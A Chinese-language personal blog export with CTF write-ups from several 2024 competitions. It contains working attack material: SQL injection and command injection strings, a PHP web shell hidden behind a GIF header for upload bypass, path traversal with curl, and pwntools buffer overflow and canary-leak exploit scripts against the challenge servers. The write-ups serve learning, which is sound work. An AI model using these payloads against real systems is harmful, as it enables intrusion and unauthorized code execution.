
[{"content":"嗨 我是貝坦\n最近要去蹭google的免費包包\n上次更新時間: 2024-10-15\r","date":"16 November 2024","externalUrl":null,"permalink":"/","section":"betan423.github.io","summary":"嗨 我是貝坦","title":"betan423.github.io","type":"page"},{"content":"","date":"16 November 2024","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"CTF","type":"tags"},{"content":"\r前言 #\r本次排名 50/287 解出好多題題 解出 #\rCrypto / AES? #\r解密網址: https://www.devglan.com/online-tools/aes-encryption-decryption\nflag: 忘記記ㄌ\nCrypto / Secret ROT13 #\r把+ offset改成- offset就可以了\ndef encrypt(text, key): encrypted_text = \u0026#34;\u0026#34; for i, char in enumerate(text): offset = ((i + 1 + key) * (i + 1)) % 26 if \u0026#39;A\u0026#39; \u0026lt;= char \u0026lt;= \u0026#39;Z\u0026#39;: new_char = chr((ord(char) - ord(\u0026#39;A\u0026#39;) + offset) % 26 + ord(\u0026#39;A\u0026#39;)) elif \u0026#39;a\u0026#39; \u0026lt;= char \u0026lt;= \u0026#39;z\u0026#39;: new_char = chr((ord(char) - ord(\u0026#39;a\u0026#39;) + offset) % 26 + ord(\u0026#39;a\u0026#39;)) else: new_char = char encrypted_text += new_char return encrypted_text # 測試範例 key = 7 plaintext = \u0026#34;NHNC{Y0[_kT0w_H0]_tU_decXypZe}\u0026#34; ciphertext = encrypt(plaintext, key) print(\u0026#34;加密後的密文:\u0026#34;, ciphertext) ans = \u0026#34;VZRU{Y0k_yd0w_Z0o_ti_rsslyxli}\u0026#34; def decrypt(text, key): encrypted_text = \u0026#34;\u0026#34; for i, char in enumerate(text): offset = ((i + 1 + key) * (i + 1)) % 26 if \u0026#39;A\u0026#39; \u0026lt;= char \u0026lt;= \u0026#39;Z\u0026#39;: new_char = chr((ord(char) - ord(\u0026#39;A\u0026#39;) - offset) %26 + ord(\u0026#39;A\u0026#39;)) elif \u0026#39;a\u0026#39; \u0026lt;= char \u0026lt;= \u0026#39;z\u0026#39;: new_char = chr((ord(char) - ord(\u0026#39;a\u0026#39;) - offset) %26 + ord(\u0026#39;a\u0026#39;)) else: new_char = char encrypted_text += new_char return encrypted_text ciphertext = decrypt(ans, key) print(\u0026#34;解密後的密文:\u0026#34;, ciphertext) flag: NHNC{Y0u_kn0w_H0w_to_decrypte}\nCrypto / Ande Yo Caliente #\r透過ChaCha20加密，其實我根本不會解\n但餵給GPT後他就直接幫我生出exp.py\n請勿模仿 最壞示範 點我看對話紀錄\nfrom binascii import unhexlify # Provided data iv = unhexlify(\u0026#34;635b52504ab86d67d780dede\u0026#34;) encrypted_message = unhexlify(\u0026#34;eab3ee7a3821847b76558eb61ec26f4fc7f72f436966ab7680d652b872c85c0bae4879db0748b02dde7df7ca34288a0fa21bd8889c57d3ff986a9566f09733cfbc6e\u0026#34;) encrypted_flag = unhexlify(\u0026#34;f393c557632f836f226c828c1e87634489fa2e7d7b38e477b0d14dfa66\u0026#34;) # Known plaintext message = b\u0026#34;When you feel my heat, look into my eyes\\nIt\u0026#39;s where my demons hide\u0026#34; # Recover the keystream keystream = bytes([m ^ e for m, e in zip(message, encrypted_message)]) # Decrypt the flag flag = bytes([f ^ k for f, k in zip(encrypted_flag, keystream)]) print(f\u0026#34;Recovered FLAG: {flag.decode()}\u0026#34;) flag: NHNC{what_i_learned_from_htb}\nMisc / Where is this #\rgoogle找排骨酥麵跟河堤上的貓\nflag: NHNC{24.803_120.979}\nMisc / Blog2 #\r點到推薦vt那邊的留言，可以看到管理員的留言，點進去後可以看到個人檔案\n裡面有個不要點進來 所以我們點進去就有flag了 flag: NHNC{comments_disqusjs}\nWeb / 哥布林保衞部公告 #\rF12打開就能看到被註釋掉的flag了\n也能右鍵點開 檢視網頁原始碼 查看\nflag: NHNC{BeCareful!}\nWeb / EASY METHOD #\r透過標題還有點進去都有特別提及HTTP Method，就是GET、POST那些的\n使用burp suite攔截封包然後送到repeater，開始改HTTP Method\n找了一下發現有OPTIONS、GET、HEAD、POST、PUT、DELETE、TRACE、CONNECT這幾種\n最後改成PUT就有flag了\n也能用curl來改啦 但我不會 ㄏ\nflag: NHNC{Y0u_kn0w_H0w_t0_us3_CURL}\nWeb / I need to get the C00kies #\rF12把自己的cookie值改成admin\nflag: NHNC{You_Kn0w_H0w_t0_chang3_th3_c00ki3}\nWeb / Login #\rSQLI\nUsername填admin' OR 1=1 ;--\nPassword隨便寫就可以了 因為上面已經將後續都註釋掉了\nflag: NHNC{S1mp|e_-_SQL!}\nWeb / 1 line php #\r透過%0A能夠在bash中換行，於是後面就可以開始command injection了 接著發動通靈能力，cd 到根目錄(/)看到 flag- ，接著輸出該檔案就可以ㄌ\npayload: cmd=%0Acd%20/%20;cat%20flag-\nflag: NHNC{enter_is_always_the_best}\nReverse / easyyyyyyyyyy #\r不知道為甚麼我直接執行會失敗\n但總之把他丟到ida後就會發現有個function叫flag(void)\n點進去就有了\nflag: NHNC{this_is_a_easy_one}\nReverse / Guess the num #\r一開始直接透過ida去把猜數字最後比較的部分從jnz改成jz\n結果發現最後輸出的flag是假的qq\n實際去查看了一下每個function後，發現其中sub_1217很可疑，有調用到flag，看起來疑似是在作解密之類的?\n接著透過gdb直接跳到該function，由於這題的base address不是常見的0x400000，因此這邊要先下vmmap來看一下base address\n查看後發現是0x0000555555554000，那再來就先在目標function下一個bp然後跳到那邊ni逐步執行就可以了\nb *(0x0000555555554000+0x1217)\rjump *(0x0000555555554000+0x1217) flag: NHNC{traced_down_to_dtor}\nPwn / Grading system #\r觀察原代碼可以發現這題存在陣列溢出問題\n其實我也不知道是不是叫這個名子 好像不是 但隨便\n總之由於他沒有限制我們對於陣列查找的範圍\n因此我們能透過輸入超出陣列大小的值，來leak出其他值\n然後這題還很貼心的把admin初始化為1234，而且還提供了快速dump陣列值的功能\n我們剛開始學生數量任意輸入，接著透過Dump功能來查找1234的值位於陣列何處\n最後再透過修改該值為1，即可透過輸入S來getshell\nflag: NHNC{i_dont_think_you_are_a_teacher}\nForensics / MagicButton #\r下載下來後點按鈕就會噴flag了\nflag: NHNC{This_is_real_vuln}\nForensics / Kohiro #\r圖片很明顯是被裁切過，因此這邊要來改變圖片的高度\n透過hex編輯器(我是用010editor)找到其中控制寬高的部分\n可以透過先將當前圖片的長度/高度轉成hex的形式，再拿去裡面搜尋相同的值\n搜尋後可以發現是在其中的00A0,3~6為高、寬的長度\n這邊把高的長度加長一點就有flag了\n矮額\nflag: NHNC{you_can_edit_hex_00A0_04}\nForensics / Suspicious GIF #\r把gif逐禎分解後就有flag了\nconvert sus.gif flag.png flag: NHNC{FrAmE_bY_fRaMe}\nForensics / BotNet1 #\r進去\r查詢網址後，查看Internal Transactions\nflag: NHNC{0x3e9e0e9cee22Ccd0ac94604A72394B0A1CCdb27A}\n未解出 #\rForensics / MagicButton #\rForensics / BotNet2 #\rCrypto / Baby RSA #\rWeb / Miday #\rWeb / Democracy #\rReverse / Here\u0026rsquo;s the sauce #\rReverse / Kid game #\rReverse / Yet Another password checker #\rPWN / DOF #\rPWN / Filtered #\r總結 #\r這次解到滿躁的 感覺很多都差一點 然後有些題目很幹( 耶繼續努力 plus ultra\n","date":"16 November 2024","externalUrl":null,"permalink":"/posts/010_weeklyctf05/","section":"Posts","summary":"這次打的是No Hack No CTF 2024","title":"No Hack No CTF 2024","type":"posts"},{"content":"","date":"16 November 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"16 November 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"\r別虐了\u0026hellip;\n算在每周ctf內，之後應該都把名子改成比賽名稱\n共通點應該是都不會有封面\n前言 #\r比賽剛開就把會的題目就秒殺了 直接衝到第三名\n然後再來就開始躺了\n❎ 不會解\n✅ 懶得解\n這次Misc一題都 不會 不敢碰\n本次排名 25/106 解出10題 解出 #\rWelcome / 競賽規則 #\r在ruls的部分最下面有一串base64的東東，丟去解密後就有flag了\nflag: NCKUCTF{我會遵守以上規則因為我是好駭客}\nWelcome / Discord #\r藏在dc 🩸｜迎新盃＆首殺公告 的頻道主題內\n比較機車的點是 基本上要全螢幕才看得到後面的那串描述\nflag: NCKUCTF{Welcome to 2024 NCKUCTF Freshmen Cup!}\nWelcome / 回饋表單 #\r請大家去乖乖填表單 甚至只有27個人解完這題\nflag: NCKUCTF{Thanks for your playing, have a nice day!}\nPwn /[新手友善] Overflow Tutorial #\r考了 integer overflow 還有overwrite data的概念 (應該是叫這個沒錯\n簡單來講就是整數溢出跟複寫\n第二個複寫的部分如果懶得算具體前面要送多少字元的話，可以就直接先無腦噴一堆A，然後再去慢慢縮減就好\npayload: 251\rAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANCKUCTF flag: NCKUCTF{H0p3_U_LeaRNed_Some_concept_Ab0ut_Sof7w4r3_sEcur1tY_N0w_0a05f6c72945fc781e1a0f5b54dc285a}\nPwn / Every pwner\u0026rsquo;s first challenge #\r透過buffer overflow來覆蓋 return address 的值，讓他最後變成是回到 call_me function\n找 win function 的話可以用 gdb 的 info func 或是 IDA 直接打開看都可以\n然後具體前面要先送多少字元才能蓋到 ret address 的話可以透過 pwn tool 的 cyclic ，先多送一大堆值進去，再透過GDB來查看報錯時的 $rsp 內容，最後再透過 cyclic_find(\u0026quot;$rsp的值\u0026quot;) 即可找出要覆蓋多少\nfrom pwn import * import sys import time context.log_level = \u0026#34;debug\u0026#34; context.arch = \u0026#34;amd64\u0026#34; def one_gadget(filename: str) -\u0026gt; list: return [ int(i) for i in __import__(\u0026#39;subprocess\u0026#39;).check_output( [\u0026#39;one_gadget\u0026#39;, \u0026#39;--raw\u0026#39;, filename]).decode().split(\u0026#39; \u0026#39;) ] if len(sys.argv) == 1: r = process(\u0026#34;./chal\u0026#34;) if args.GDB: gdb.attach(r, \u0026#39;b *0x401228\u0026#39;) elif len(sys.argv) == 3: r = remote(sys.argv[1], sys.argv[2]) else: print(\u0026#34;Usage: python3 {} [GDB | REMOTE_IP PORT]\u0026#34;.format(sys.argv[0])) sys.exit(1) s = lambda data :r.send(data) sa = lambda x, y :r.sendafter(x, y) sl = lambda data :r.sendline(data) sla = lambda x, y :r.sendlineafter(x, y) ru = lambda delims, drop=True :r.recvuntil(delims, drop) uu32 = lambda data,num :u32(r.recvuntil(data)[-num:].ljust(4,b\u0026#39;\\x00\u0026#39;)) uu64 = lambda data,num :u64(r.recvuntil(data)[-num:].ljust(8,b\u0026#39;\\x00\u0026#39;)) leak = lambda name,addr :log.success(\u0026#39;{} = {}\u0026#39;.format(name, addr)) l64 = lambda :u64(r.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8,b\u0026#34;\\x00\u0026#34;)) l32 = lambda :u32(r.recvuntil(\u0026#34;\\xf7\u0026#34;)[-4:].ljust(4,b\u0026#34;\\x00\u0026#34;)) # payload --\u0026gt; win = 0x401196 # payload= cyclic(100) payload= cyclic(40) + p64(win) sla(b\u0026#34;Welcome to NCKUCTF Freshmen cup!\\n\u0026#34;, payload) r.interactive() flag: NCKUCTF{Y0ur_Pwn_J0urn3y_S74rts_FrOM_noW!_19999da0cf8e994642f89c8015ca5d05}\nReverse / ✌️✊✋ #\r直接執行就有flag了，本來還以為是題目寫爆了?\nflag: NCKUCTF{w0W_yOU_4re_vErY_gooD_47_ROck_PAPeR_5cS50RS!!}\nReverse / Youtube Video Recommendation Tool #\r直接strings 查看會輸出的全部yt連接，最後發現其中一個的標題就是flag了\nflag: NCKUCTF{w4I7_a_MiNU73_kaITō_kiddOoa4}\nReverse / Baby Python Assembly #\r基本上把兩段code都塞給GPT他就會幫你生出原本的list了\n謝謝GPT拯救所有懶得看不會組語的我\n但最好還是去乖乖看組語啦哈哈\n跟GPT的對話過程\nflag: NCKUCTF{baby_pyth0N_1s_s0_EzZzzzzZZzzzzzZzzzz_Vincent55_is_so_Electric_OrzZzZZ_a8b40af05731c9612abeec69772de8e8ca8be759000d272e89f9ea5d413b2477}\nWeb / 好駭客的網站 #\r簡單來講就是塞web shell，但聽說是題目出爆了才會被簡單繞過\n在上傳圖片的部分先透過 burp suite 攔下發送的封包，送到 repeater 中開始修改\n首先會擋掉附檔名為 .php 的內容，但這部分可以變成送 .Php 來繞過\n再來是內容部分不能直接放shell code，前面要先加一段允許格式的Magic Numbers來繞過，這邊我是用gif的\n再來就到上傳圖片的地方後面的cmd加上想執行的指令就可以了\nhttp://chall.nckuctf.org:29103/uploads/aaaa_test.Php?cmd=塞這邊\npayload: GIF87a \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]);?\u0026gt; flag: NCKUCTF{YOu_are_a_g00d_H4cK3r_Just_Lik3_Vincent55_V3ry_N1c3_945dae36ca165274}\nCrypto / E? #\r一樣是靠GPT拿到的exp 這邊直接套原話\n你可以使用 中國餘數定理（CRT） 來解這個問題，前提是這些 e1 和 e2 是互質的。\n你有兩個方程式： c1 = pow(m, e1, n)\nc2 = pow(m, e2, n)\n如果你知道 c1 和 c2 相等，並且知道 e1 和 e2，那麼你可以利用擴展的歐幾里得算法來求解 m。\n利用擴展的歐幾里得算法來找到 s1 和 s2，使得：\ns1 * e1 + s2 * e2 = 1\n根據這個結果，你可以計算出：\nm ≡ (pow(c1, s1, n) * pow(c2, s2, n)) % n\n這樣就能算出 m 的值。\nimport math # 擴展歐幾里得算法 def extended_gcd(a, b): if b == 0: return a, 1, 0 gcd, x1, y1 = extended_gcd(b, a % b) x = y1 y = x1 - (a // b) * y1 return gcd, x, y # 主要解碼邏輯 def decrypt(c1, c2, e1, e2, n): gcd, s1, s2 = extended_gcd(e1, e2) if gcd != 1: raise ValueError(\u0026#34;e1 和 e2 必須互質\u0026#34;) # 如果 s1 是負數，將其轉換為正數 if s1 \u0026lt; 0: c1 = pow(c1, -s1, n) c1 = pow(c1, -1, n) else: c1 = pow(c1, s1, n) # 如果 s2 是負數，將其轉換為正數 if s2 \u0026lt; 0: c2 = pow(c2, -s2, n) c2 = pow(c2, -1, n) else: c2 = pow(c2, s2, n) # 得到原始的 m m = (c1 * c2) % n return m # 示例 n = 3233 # 一個模數 n m = 42 # 原始消息 e1 = 3 # 第一個公開指數 e2 = 7 # 第二個公開指數 # 加密得到的密文 c c1 = pow(m, e1, n) c2 = pow(m, e2, n) # 用 c1 和 c2 來解密 解密後的_m = decrypt(c1, c2, e1, e2, n) print(f\u0026#34;解密後的消息 m = {解密後的_m}\u0026#34;) 未解出 #\r參考Write Up\nReverse / 2048?? #\r因為不會用dnspy下斷點查看flag的內容，所以最後還是用CE\n透過dnspy查看勝利條件後，可以發現最終目標是要出現數字為2486的方塊，但理論上不可能達成，因此\nCE 啟動!! 慢慢尋找後會發現它儲存的方法是根據每一格位置來存，不是看自己方塊的數字(?)\n例如說左下的格子現在是2，但你把2移走後就會是0\n既然找到內存位置後，再來就只需要把它改成2486就可以了\n// Token: 0x0600001C RID: 28 public bool checkGoal() { for (int i = 0; i \u0026lt; 4; i++) { for (int j = 0; j \u0026lt; 4; j++) { if (this.iBoard[i][j] == this.goal) { return true; } } } return false; } // Token: 0x0400000E RID: 14 private int goal = 2486; flag: NCKUCTF{WHo_I5_RO63R?}\nWeb / Just Image #\r比賽的時候想不到沒有.要怎麼回到根目錄就沒解出來，結果//就可以了qq\n先直接去查看會動的鳥鳥圖片網址，發現最後的格式是base64加密後的，因此我們只需要將目標路徑也base64過後再送過去就好了\nhttp://chall.nckuctf.org:29202/img/Ly9mbGFn 最後再把網站Ctrl+s存下來，在原本的網站讀不出來得原因是因為他不是圖片檔，存成txt之類的就可以了\nflag: NCKUCTF{os.path.join can join to root}\nMisc / Double Exploit #\r很酷的一題，現在才知道原來這些東西都可以撈，喵\n原始碼如下\n\u0026lt;?php require \u0026#34;secret.php\u0026#34;; if (isset($_GET[\u0026#39;payload\u0026#39;])){ $payload=$_GET[\u0026#39;payload\u0026#39;]; if (strlen($payload)\u0026gt;6) die(\u0026#34;Bad bad cat\u0026#34;); $result=shell_exec(\u0026#34;./pwn_me \u0026#34;.$payload); if ($result==\u0026#34;Meowing Whale\u0026#34;){ echo $flag; } } highlight_file(\u0026#34;index.php\u0026#34;); 先查看題目會發現，payload的部分只能輸入6個字元、 最後的result要為\u0026quot;Meowing Whale\u0026quot;\n首先能透過http://chall.nckuctf.org:29205/pwn_me，來下載pwn_me去做分析\n透過IDA查看後會發現，輸入的第二字元為#則會輸出我們要的Meowing\n再來透過存取http://chall.nckuctf.org:29205/Dockerfile，可以發現還可以存取一個叫f的檔案，一樣把它下載下來，發現執行後就會輸出Whale\n東西都找到了，最後就把它們串在一起就可以了 payload=0%23;.%2ff\n不知道為甚麼payload直接送 0#;./f 會失敗，要變成送url編碼後的形式才可以\nflag: NCKUCTF{my_first_pwn+web+rev_XD}\n總結 #\r耶寫完了 排版一樣很醜\n這次好廢喔 明年還打 好打一直打\n","date":"14 October 2024","externalUrl":null,"permalink":"/posts/009_weeklyctf04/","section":"Posts","summary":"這次打的是成大資安社迎新杯","title":"成大資安社迎新杯 CTF","type":"posts"},{"content":"\rplus ultra\r前言 #\r這禮拜比較忙 很多事情擠在一起\n事後檢討比較沒有時間看 所以這禮拜就稍微水一周吧欸嘿\n本次排名 444/1033 解出3題 qq 解出 #\rWarmup / Welcome #\r進dc就看得到ㄌ\nWarmup / Math Gone Wrong #\r簡單來講就是要讓以下成立\nn1*10+n2*10 != (n1+n2)*10\nn1、n2輸入小數點就可以順利通過ㄌ\nWarmup / Introspection #\r題目code\nchar buf[1008]; printf(\u0026#34;\u0026gt;\u0026gt; \u0026#34;); read(0, buf, 1008); 簡單來講就是如果剛好輸入1008個字元，會把最後null byte也蓋掉\n因此輸出的時候就會不知道buf的內容已經結束，會接續把後面flag[]內的內容也噴出來\n總結 #\r最近比較忙 很多事情都擠在這幾周\n所以這次沒什麼看賽後 搜哩 下周一定\n","date":"10 October 2024","externalUrl":null,"permalink":"/posts/008_weeklyctf03/","section":"Posts","summary":"這次打的是iron CTF","title":"每周CTF計畫03","type":"posts"},{"content":"\r迪奧：\njojo，一個人的能力是有極限的 我從短暫的人生中學到一件事\u0026hellip;\u0026hellip;\n越是玩CTF，就越會發現一個人的能力是有極限的\u0026hellip; 除非超越人類。\n喬納森：\n你到底想說什麼？\r前言 #\r這次參加的是 BuckeyeCTF 2024 ，這次在CTFtime找比賽的時候有看到一個有點類似picoCTF gym的網站(?\n裡面也是滿多他舉辦的CTF歷屆題目的 網址點我 有興趣可以去練習\n本次排名 145/648 解出13題 但都滿基本的 題目 #\rbctf #\rrev #\rflagwatch #\r透過\r工具把腳本逆向成回來，透過ASCII解密得到原始碼，看出加密邏輯\na=[62,63,40,58,39,40,111,63,52,50,53,63,104,48,48,37,3,61,3,55,57,37,48,108,59,59,111,46,33] print(len(a)) for i in range(29): print(chr(a[i]^92),end=\u0026#39;\u0026#39;) # flag bctf{t3chnic4lly_a_keyl0gg3r} text #\r使用工具jd-gui-windows-1.6.6\n這題是透過把文字冒險寫成jar然後要逆向\n但透過jd-gui去察看後會發現裡面基本上就是一對if else來控制\n慢慢逆向即可 雖然滿簡單但我覺得滿好玩的\npayload enter pick up torch go right cross the bridge take rope (CrystalRoom) leave leave go center go down go right use the rope pick up sword (AcrossRiver) leave leave leave leave (EntryHall) go left cut pick up key leave leave go center go down left unlock the door reach through the crack in the rocks the crack in the rocks concealing the magical orb with the flag flag: bctf{P33r_1nT0_tH3_j4r_2_f1nd_Th3_S3cR3Ts_d1463580a690f294}\nbeginner-pwn #\rrunway0 #\rarray開100但允許輸入0x100，存在overwrite漏洞，把想執行的東西蓋到command[]的部分即可 \u0026lsquo;a\u0026rsquo;*112+cat flag.txt flag: bctf{0v3rfl0w_th3_M00m0ry_2d310e3de286658e}\nrunway1 #\r透過overflow把win function的address覆蓋到return address，也就是esp的值\nfrom pwn import * import sys import time context.log_level = \u0026#34;debug\u0026#34; context.arch = \u0026#34;amd64\u0026#34; def one_gadget(filename: str) -\u0026gt; list: return [ int(i) for i in __import__(\u0026#39;subprocess\u0026#39;).check_output( [\u0026#39;one_gadget\u0026#39;, \u0026#39;--raw\u0026#39;, filename]).decode().split(\u0026#39; \u0026#39;) ] if len(sys.argv) == 1: r = process(\u0026#34;./runway1\u0026#34;) if args.GDB: gdb.attach(r,\u0026#39;b *(0x804928f)\u0026#39;) elif len(sys.argv) == 3: r = remote(sys.argv[1], sys.argv[2]) else: print(\u0026#34;Usage: python3 {} [GDB | REMOTE_IP PORT]\u0026#34;.format(sys.argv[0])) sys.exit(1) s = lambda data :r.send(data) sa = lambda x, y :r.sendafter(x, y) sl = lambda data :r.sendline(data) sla = lambda x, y :r.sendlineafter(x, y) ru = lambda delims, drop=True :r.recvuntil(delims, drop) uu32 = lambda data,num :u32(r.recvuntil(data)[-num:].ljust(4,b\u0026#39;\\x00\u0026#39;)) uu64 = lambda data,num :u64(r.recvuntil(data)[-num:].ljust(8,b\u0026#39;\\x00\u0026#39;)) leak = lambda name,addr :log.success(\u0026#39;{} = {}\u0026#39;.format(name, addr)) l64 = lambda :u64(r.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8,b\u0026#34;\\x00\u0026#34;)) l32 = lambda :u32(r.recvuntil(\u0026#34;\\xf7\u0026#34;)[-4:].ljust(4,b\u0026#34;\\x00\u0026#34;)) # payload --\u0026gt; win = 0x80491E6 payload= cyclic(76) + p64(win) sla(\u0026#34;What is your favorite food?\\n\u0026#34;,payload) r.interactive() run2 #\r本來還以為要串ROP哈哈 中間卡很久，結果後面才發現他是x32的檔案然後我都用p64\n導致覆蓋會多補八個0 改成p32就正常==\n一樣是overflow到win func只是這次win func會額外查看兩個if條件式\nfrom pwn import * import sys import time context.log_level = \u0026#34;debug\u0026#34; context.arch = \u0026#34;amd64\u0026#34; def one_gadget(filename: str) -\u0026gt; list: return [ int(i) for i in __import__(\u0026#39;subprocess\u0026#39;).check_output( [\u0026#39;one_gadget\u0026#39;, \u0026#39;--raw\u0026#39;, filename]).decode().split(\u0026#39; \u0026#39;) ] if len(sys.argv) == 1: r = process(\u0026#34;./runway2\u0026#34;) if args.GDB: gdb.attach(r,\u0026#39;b *(0x80492D3)\u0026#39;) elif len(sys.argv) == 3: r = remote(sys.argv[1], sys.argv[2]) else: print(\u0026#34;Usage: python3 {} [GDB | REMOTE_IP PORT]\u0026#34;.format(sys.argv[0])) sys.exit(1) s = lambda data :r.send(data) sa = lambda x, y :r.sendafter(x, y) sl = lambda data :r.sendline(data) sla = lambda x, y :r.sendlineafter(x, y) ru = lambda delims, drop=True :r.recvuntil(delims, drop) uu32 = lambda data,num :u32(r.recvuntil(data)[-num:].ljust(4,b\u0026#39;\\x00\u0026#39;)) uu64 = lambda data,num :u64(r.recvuntil(data)[-num:].ljust(8,b\u0026#39;\\x00\u0026#39;)) leak = lambda name,addr :log.success(\u0026#39;{} = {}\u0026#39;.format(name, addr)) l64 = lambda :u64(r.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8,b\u0026#34;\\x00\u0026#34;)) l32 = lambda :u32(r.recvuntil(\u0026#34;\\xf7\u0026#34;)[-4:].ljust(4,b\u0026#34;\\x00\u0026#34;)) # payload --\u0026gt; pop_ebp = 0x804930B win = 0x8049206 payload= cyclic(28) + p64(win)+p32(0xc0ffee)+p64(0x7ab1e) sla(\u0026#34;?\\n\u0026#34;,payload) r.interactive() color #\r其實不太懂這題，輸入A的數量剛好把array蓋滿，之後就會噴flag了\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA # flag bctf{1_d0n7_c4r3_571ll_4_m1d_c010r} crypto #\rnxor #\r做xor先得出key，再去解flag，都xor回去就好\nimport os def xnor_bit(a_bit, b_bit): if a_bit == \u0026#34;1\u0026#34; and b_bit == \u0026#34;1\u0026#34;: return \u0026#34;1\u0026#34; elif a_bit == \u0026#34;1\u0026#34; and b_bit == \u0026#34;0\u0026#34;: return \u0026#34;0\u0026#34; elif a_bit == \u0026#34;0\u0026#34; and b_bit == \u0026#34;1\u0026#34;: return \u0026#34;0\u0026#34; elif a_bit == \u0026#34;0\u0026#34; and b_bit == \u0026#34;0\u0026#34;: return \u0026#34;1\u0026#34; def xnor_byte(a_byte, b_byte): a_bits = get_bits_from_byte(a_byte) b_bits = get_bits_from_byte(b_byte) result_bits = [xnor_bit(a_bits[i], b_bits[i]) for i in range(8)] result_byte = get_byte_from_bits(result_bits) return result_byte def xnor_bytes(a_bytes, b_bytes): assert len(a_bytes) == len(b_bytes) return bytes([xnor_byte(a_bytes[i], b_bytes[i]) for i in range(len(a_bytes))]) def get_bits_from_byte(byte): return list(\u0026#34;{:08b}\u0026#34;.format(byte)) def get_byte_from_bits(bits): return int(\u0026#34;\u0026#34;.join(bits), 2) message = b\u0026#34;Blue is greener than purple for sure!\u0026#34; key = bytes.fromhex(\u0026#39;430e026909e35c169518dc18832d134d156862635e5fc58175fe9dafd88819e22e25bb2326\u0026#39;) flag = \u0026#34;de9289f08d6bcb90359f4dd70e8d95829fc8ffaf90ce5d21f96e3d635f148a68e4eb32efa4\u0026#34; enc_flag = bytes.fromhex(flag) encrypted_hex = \u0026#34;fe9d88f3d675d0c90d95468212b79e929efffcf281d04f0cfa6d07704118943da2af36b9f8\u0026#34; encrypted_bytes = bytes.fromhex(encrypted_hex) def main(): print(f\u0026#34;\\nMessage: {message}\u0026#34;) encrypted = xnor_bytes(message, encrypted_bytes) print(f\u0026#34;key: {encrypted.hex()}\u0026#34;) encrypted_flag = xnor_bytes(enc_flag, key) print(f\u0026#34;Encrypted flag: {encrypted_flag}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() flag: bctf{why_xn0r_y0u_b31ng_so_3xclu51v3}\nrsa #\r好用 https://www.dcode.fr/rsa-cipher flag: bctf{f4c70r1z3_b3773r_4d3b35e4}\nmisc #\rsanity #\r其實就是welcome\ndonut #\r一個開頭隨機的河內塔問題\n成功借助工人智慧解開\ngitgoo #\r先透過 gitTool 下載網站意外洩露的.git內容的東西\n./gitdumper.sh https://gitgoo.challs.pwnoh.io/.git/ dest-dir 直接進去看 .git/log/HEAD 的內容 發現在版本號9b474236ba20cf3f7d484b76348de51c819c0d65 有顯示洩露了flag 然後就回朔就好ㄌ\n進到dest-dir開始查看git的東西\ngit checkout 9b474236ba20cf3f7d484b76348de51c819c0d65\rgit show flag: bctf{1_h4v3_c0mm17m3n7_i55u3s_cf39ab917a7dd092992a8f9b}\nweb #\rfu #\rflag在原始碼內，但在網頁內不能F12或右鍵查看 在網址最前面加view-source:即可\nforensics #\runknown #\r下載，打開\n沒解出來但好奇的 #\rbeginner-pwn / calculator、runway3 #\r這兩題都是有開canary檢測是否有overflow的，這邊先講run3\n這題執行後會讓你輸入兩次，每次輸入後都會echo回去\n由於沒有特別檢測，因此這邊第一次輸入可以輸入\u0026amp;13$p來leak出canary的值\n因此最後payload就變成先傳送到能覆蓋的部分，接著送入canary的值，送入p64(0)對齊，最後輸入win function\n這邊直接跳到win func的頭會有問題，最少要跳到win+0x5以後才可以正常開shell\nfrom pwn import * import sys import time context.log_level = \u0026#34;debug\u0026#34; context.arch = \u0026#34;amd64\u0026#34; def one_gadget(filename: str) -\u0026gt; list: return [ int(i) for i in __import__(\u0026#39;subprocess\u0026#39;).check_output( [\u0026#39;one_gadget\u0026#39;, \u0026#39;--raw\u0026#39;, filename]).decode().split(\u0026#39; \u0026#39;) ] if len(sys.argv) == 1: r = process(\u0026#34;./runway3\u0026#34;) if args.GDB: gdb.attach(r) elif len(sys.argv) == 3: r = remote(sys.argv[1], sys.argv[2]) else: print(\u0026#34;Usage: python3 {} [GDB | REMOTE_IP PORT]\u0026#34;.format(sys.argv[0])) sys.exit(1) s = lambda data :r.send(data) sa = lambda x, y :r.sendafter(x, y) sl = lambda data :r.sendline(data) sla = lambda x, y :r.sendlineafter(x, y) ru = lambda delims, drop=True :r.recvuntil(delims, drop) uu32 = lambda data,num :u32(r.recvuntil(data)[-num:].ljust(4,b\u0026#39;\\x00\u0026#39;)) uu64 = lambda data,num :u64(r.recvuntil(data)[-num:].ljust(8,b\u0026#39;\\x00\u0026#39;)) leak = lambda name,addr :log.success(\u0026#39;{} = {}\u0026#39;.format(name, addr)) l64 = lambda :u64(r.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8,b\u0026#34;\\x00\u0026#34;)) l32 = lambda :u32(r.recvuntil(\u0026#34;\\xf7\u0026#34;)[-4:].ljust(4,b\u0026#34;\\x00\u0026#34;)) # payload --\u0026gt; sla(b\u0026#34;?\\n\u0026#34;, b\u0026#34;%13$p\u0026#34;) canary = int(r.readline().decode(), 16) win = 0x4011D6 + 0x5 payload= cyclic(40) payload+=p64(canary) payload += p64(0) payload+=p64(win) sl(payload) r.interactive() 另一題calu則是一個計算機，一開始讓你輸入兩個數字做運算，最後讓你輸入任意東西\n這邊先透過在第一次輸入1*pi，接著他會問你pi要幾位數，輸入100016，後面[-11:-3]即為canary的內容\n接下來就和上面run3差不多ㄌ\n參考write up\npwn / no_handouts #\r以為是ret2libc 結果是要串ROP自己寫shell去讀flag.txt\n哈哈我回去乖乖複習ROP那堂課\u0026hellip;\nweb / SSFS #\r本來以為是web shell結果只是LFI哈哈\n直接在網站搜尋/../../flag.txt，前面../的部分會被自動審略，因此透過curl \u0026ndash;path-as-is來避免過濾掉../\ncurl --path-as-is https://ssfs.challs.pwnoh.io/download/../../flag.txt forensics / couch potato、wreck、duck-pics #\rcouch potato 一個wav檔，透過\rSSTV Decoder轉成png就有flag了 wreck 一個elf檔案，strings grep flag他會看到有flag.jpg的東西，透過binwalk把他內容dump下來\nbinwalk -e --dd=\u0026#39;.*\u0026#39; dump 